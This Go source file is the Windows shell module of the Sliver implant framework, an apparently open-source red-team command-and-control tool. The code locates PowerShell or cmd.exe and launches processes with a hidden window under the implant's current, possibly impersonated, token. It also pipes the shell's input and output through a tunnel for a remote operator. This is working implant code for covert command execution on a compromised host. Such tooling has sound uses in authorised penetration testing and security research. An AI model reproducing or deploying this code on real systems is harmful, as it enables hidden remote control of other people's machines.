package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"golang.org/x/sys/windows"
	"os/exec"
	"syscall"
)

var (
	// Shell constants
	commandPrompt = []string{"C:\\Windows\\System32\\cmd.exe"}
	powerShell    = []string{
		"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"-NoExit",
		"-Command", "[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8",
	}
)

// GetSystemShellPath - Find powershell or cmd
func GetSystemShellPath(path string) []string {
	if exists(path) {
		return []string{path}
	}
	if exists(powerShell[0]) {
		return powerShell
	}
	return commandPrompt
}

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(tunnelID uint64, command []string, _ bool) *Shell {
	return pipedShell(tunnelID, command)
}

func pipedShell(tunnelID uint64, command []string) *Shell {
	// {{if .Config.Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	var cmd *exec.Cmd
	cmd = exec.Command(command[0], command[1:]...)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  stdout,
		Stdin:   stdin,
	}
}
